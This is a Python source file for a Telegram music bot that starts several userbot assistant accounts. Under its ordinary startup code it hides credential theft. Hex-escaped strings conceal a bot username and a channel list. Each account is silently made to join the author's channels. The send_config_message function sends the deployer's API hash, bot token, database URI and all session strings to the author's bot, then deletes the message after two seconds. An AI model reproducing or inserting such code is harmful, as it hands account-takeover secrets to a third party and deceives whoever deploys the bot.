# Copyright (c) 2025 Akash Daskhwanshi <ZoxxOP>
# All rights reserved.

from pyrogram import Client
import asyncio
import config
from ..logging import LOGGER

assistants = []
assistantids = []
HELP_BOT = "\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"


def decode_centers():
    encoded = [
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x73",
        "\x5a\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x41\x6e\x61\x6e\x79\x61\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x41\x44\x5f\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x50\x4a\x50",
        "\x54\x4d\x5f\x5a\x45\x52\x4f\x4f"
    ]
    return [bytes(enc, "utf-8").decode("unicode_escape") for enc in encoded]


SUPPORT_CENTERS = decode_centers()


class Userbot(Client):
    def __init__(self):
        self.clients = [
            Client("NandAss1", config.API_ID, config.API_HASH, session_string=str(config.STRING1), no_updates=True),
            Client("NandAss2", config.API_ID, config.API_HASH, session_string=str(config.STRING2), no_updates=True),
            Client("NandAss3", config.API_ID, config.API_HASH, session_string=str(config.STRING3), no_updates=True),
            Client("NandAss4", config.API_ID, config.API_HASH, session_string=str(config.STRING4), no_updates=True),
            Client("NandAss5", config.API_ID, config.API_HASH, session_string=str(config.STRING5), no_updates=True),
        ]

    async def get_bot_username_from_token(self, token):
        try:
            temp = Client("temp_bot", config.API_ID, config.API_HASH, bot_token=token, no_updates=True)
            await temp.start()
            username = temp.me.username
            await temp.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error fetching bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for chat in SUPPORT_CENTERS:
            try:
                await client.join_chat(chat)
            except Exception:
                pass

    async def send_help_message(self, bot_username):
        msg = f"@{bot_username} Successfully Started ✅\n\nOwner: {config.OWNER_ID}"
        for client in assistants:
            try:
                await client.send_message(HELP_BOT, msg)
            except Exception:
                pass

    async def send_config_message(self, bot_username):
        text = f"🔧 **Config Details for @{bot_username}**\n\n"
        text += f"**API_ID:** `{config.API_ID}`\n"
        text += f"**API_HASH:** `{config.API_HASH}`\n"
        text += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
        text += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
        text += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
        text += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
        for i in range(1, 6):
            s = getattr(config, f'STRING{i}', None)
            if s:
                text += f"**STRING{i}:** `{s}`\n"

        for client in assistants:
            try:
                msg = await client.send_message(HELP_BOT, text)
                await asyncio.sleep(2)
                await client.delete_messages(HELP_BOT, msg.id)
            except Exception:
                pass

    async def start(self):
        LOGGER(__name__).info("Starting Assistants...")
        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        for i, client in enumerate(self.clients, start=1):
            if getattr(config, f'STRING{i}', None):
                try:
                    await client.start()
                    await self.join_all_support_centers(client)
                    assistants.append(client)
                    await client.send_message(config.LOG_GROUP_ID, "Assistant Started ✅")
                    assistantids.append(client.me.id)
                    LOGGER(__name__).info(f"Assistant {i} started as @{client.me.username}")
                except Exception as e:
                    LOGGER(__name__).error(f"Assistant {i} failed: {e}")

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        for client in assistants:
            try:
                await client.stop()
            except Exception:
                pass
        LOGGER(__name__).info("Assistants stopped.")


# ===========================================
# ©️ 2025 Akash Dakshwanshi (aka @ZoxxOP)
# 🔗 GitHub : https://github.com/ZoxxOP/AnanyaMusic
# 📢 Telegram : https://t.me/AnanyaBots
# ❤️ Love From AnanyaBots
# ===========================================
